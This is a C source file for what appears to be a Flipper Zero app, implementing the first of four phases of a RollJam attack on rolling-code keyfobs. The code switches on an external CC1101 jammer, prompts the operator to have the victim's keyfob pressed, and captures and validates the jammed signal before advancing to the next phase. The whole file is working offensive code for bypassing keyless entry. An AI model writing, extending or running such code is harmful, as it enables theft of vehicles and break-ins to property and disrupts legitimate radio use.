#include "rolljam_scene.h"
#include "../helpers/rolljam_cc1101_ext.h"
#include "../helpers/rolljam_receiver.h"

// ============================================================
// Phase 1: JAM + CAPTURE first keyfob press
// ============================================================

static void phase1_timer_callback(void* context) {
    RollJamApp* app = context;

    if(app->signal_first.size >= 20 &&
       rolljam_signal_is_valid(&app->signal_first)) {
        view_dispatcher_send_custom_event(
            app->view_dispatcher, RollJamEventSignalCaptured);
    }
}

void rolljam_scene_attack_phase1_on_enter(void* context) {
    RollJamApp* app = context;

    widget_reset(app->widget);
    widget_add_string_element(
        app->widget, 64, 2, AlignCenter, AlignTop,
        FontPrimary, "PHASE 1 / 4");
    widget_add_string_element(
        app->widget, 64, 16, AlignCenter, AlignTop,
        FontSecondary, "Starting...");
    widget_add_string_element(
        app->widget, 64, 56, AlignCenter, AlignTop,
        FontSecondary, "[BACK] cancel");
    view_dispatcher_switch_to_view(app->view_dispatcher, RollJamViewWidget);

    rolljam_ext_set_flux_capacitor(app->hw_index == HwIndex_FluxCapacitor);

    rolljam_jammer_start(app);
    furi_delay_ms(300);

    widget_reset(app->widget);
    widget_add_string_element(
        app->widget, 64, 2, AlignCenter, AlignTop,
        FontPrimary, "PHASE 1 / 4");
    if(app->jamming_active) {
        widget_add_string_element(
            app->widget, 64, 16, AlignCenter, AlignTop,
            FontSecondary, "Jamming active...");
        FURI_LOG_I(TAG, "Phase1: jammer activo en %lu Hz", app->jam_frequency);
    } else {
        widget_add_string_element(
            app->widget, 64, 16, AlignCenter, AlignTop,
            FontSecondary, "No ext jammer");
        FURI_LOG_W(TAG, "Phase1: sin jammer, capturando de todas formas");
    }
    widget_add_string_element(
        app->widget, 64, 28, AlignCenter, AlignTop,
        FontSecondary, "Listening for keyfob");
    widget_add_string_element(
        app->widget, 64, 42, AlignCenter, AlignTop,
        FontPrimary, "PRESS KEYFOB NOW");
    widget_add_string_element(
        app->widget, 64, 56, AlignCenter, AlignTop,
        FontSecondary, "[BACK] cancel");

    rolljam_capture_start(app);

    notification_message(app->notification, &sequence_blink_blue_100);

    FuriTimer* timer = furi_timer_alloc(
        phase1_timer_callback, FuriTimerTypePeriodic, app);
    furi_timer_start(timer, 300);

    scene_manager_set_scene_state(
        app->scene_manager, RollJamSceneAttackPhase1, (uint32_t)timer);

    FURI_LOG_I(TAG, "Phase1: waiting for 1st keyfob press...");
}

bool rolljam_scene_attack_phase1_on_event(void* context, SceneManagerEvent event) {
    RollJamApp* app = context;

    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == RollJamEventSignalCaptured) {
            rolljam_capture_stop(app);

            if(!rolljam_signal_is_valid(&app->signal_first)) {
                FURI_LOG_W(TAG, "Phase1: false capture, restarting RX...");
                app->signal_first.size  = 0;
                app->signal_first.valid = false;
                furi_delay_ms(50);
                rolljam_capture_start(app);
                return true;
            }

            rolljam_signal_cleanup(&app->signal_first);
            app->signal_first.valid = true;

            notification_message(app->notification, &sequence_success);
            FURI_LOG_I(TAG, "Phase1: 1st signal captured! size=%d",
                       (int)app->signal_first.size);

            scene_manager_next_scene(app->scene_manager, RollJamSceneAttackPhase2);
            return true;
        }
    } else if(event.type == SceneManagerEventTypeBack) {
        FURI_LOG_I(TAG, "Phase1: cancelled");
        rolljam_capture_stop(app);
        rolljam_jammer_stop(app);
        scene_manager_search_and_switch_to_another_scene(
            app->scene_manager, RollJamSceneMenu);
        return true;
    }
    return false;
}

void rolljam_scene_attack_phase1_on_exit(void* context) {
    RollJamApp* app = context;

    FuriTimer* timer = (FuriTimer*)scene_manager_get_scene_state(
        app->scene_manager, RollJamSceneAttackPhase1);
    if(timer) {
        furi_timer_stop(timer);
        furi_timer_free(timer);
    }

    widget_reset(app->widget);
}
